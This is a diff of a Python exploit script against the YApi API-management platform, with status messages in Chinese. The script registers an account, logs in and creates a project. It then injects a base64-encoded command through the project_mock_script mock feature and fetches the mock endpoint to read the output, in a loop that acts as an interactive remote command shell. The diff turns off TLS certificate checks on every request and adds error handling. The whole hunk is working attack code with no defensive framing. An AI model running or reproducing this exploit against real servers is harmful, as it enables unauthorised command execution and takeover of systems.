@@ -24,59 +24,63 @@ def main(target):
             "password":id,
             "username":id
         }
-        reg = requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data))
+        reg = requests.post(url+"/api/user/reg",headers=header,verify=False,timeout=5,data=json.dumps(data))
         print(reg.json())
         if(reg.json()['errcode']==0):
             print("注册成功")
         else:
             exit("注册失败")
-        login = requests.post(url+"/api/user/login",headers=header,timeout=5,data=json.dumps(data))
+        login = requests.post(url+"/api/user/login",headers=header,verify=False,timeout=5,data=json.dumps(data))
         print(login.json())
         if(login.json()['errcode']==0):
             print("登录成功")
         else:
             exit("登陆失败")
         header['Cookie'] = login.headers['Set-Cookie'].split(";")[0]+"; _yapi_uid="+str(login.json()['data']['uid'])
-        #print(requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data)).json())
-        group_id = requests.get(url+"/api/group/list",headers=header,timeout=5).json()['data'][0]['_id']
+        #print(requests.post(url+"/api/user/reg",headers=header,verify=False,timeout=5,data=json.dumps(data)).json())
+        try:
+            group_id = requests.get(url+"/api/group/list",headers=header,verify=False,timeout=5).json()['data'][0]['_id']
+        except:
+            exit("获取用户信息失败")
         #print("当前用户组")
         #print(group_id)
         data = {
             "name":id,"group_id":group_id,"icon":"code-o","color":"pink","project_type":"private"
         }
-        projid = requests.post(url+"/api/project/add",headers=header,timeout=5,data=json.dumps(data)).json()['data']['_id']
+        projid = requests.post(url+"/api/project/add",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()['data']['_id']
         #print("当前项目")
         #print(projid)
         payload = defaultpayload.replace("d2hvYW1p", base64.b64encode(cmd.encode()).decode())
         data = {
             "id":projid,"project_mock_script":payload,"is_mock_open":True
         }
-        up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
+        up = requests.post(url+"/api/project/up",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
         #print(up)
-        catid = requests.get(url+"/api/interface/list_menu?project_id="+str(projid),headers=header,timeout=5).json()['data'][0]['_id']
+        catid = requests.get(url+"/api/interface/list_menu?project_id="+str(projid),headers=header,verify=False,timeout=5).json()['data'][0]['_id']
         #print(catid)
         data = {"method":"GET","catid":catid,"title":id,"path":"/"+id,"project_id":projid}
-        api = requests.post(url+"/api/interface/add",headers=header,timeout=5,data=json.dumps(data)).json()
+        api = requests.post(url+"/api/interface/add",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
         #print(api)
         print(url+"/mock/"+str(projid)+"/"+id)
         print("cmd:")
         print(cmd)
         print("out:")
-        print(base64.b64decode(requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5).text).decode().strip())
+        print(base64.b64decode(requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5).text).decode().strip())
         while True:
             cmd = input("cmd:\n")
             payload = defaultpayload.replace("d2hvYW1p", base64.b64encode(cmd.encode()).decode())
             data = {
                 "id":projid,"project_mock_script":payload,"is_mock_open":True
             }
-            up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
-            out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5).text.encode()
+            up = requests.post(url+"/api/project/up",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
+            out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5).text.encode()
             print("out:")
             try:
                 print(base64.b64decode(out).decode().strip())
             except:
                 pass
-                print("无回显，或者解码失败")
+                print("或者命令执行失败")
+                print(out)
     except:
         # print("Unexpected error:", sys.exc_info()[0])
         # raise
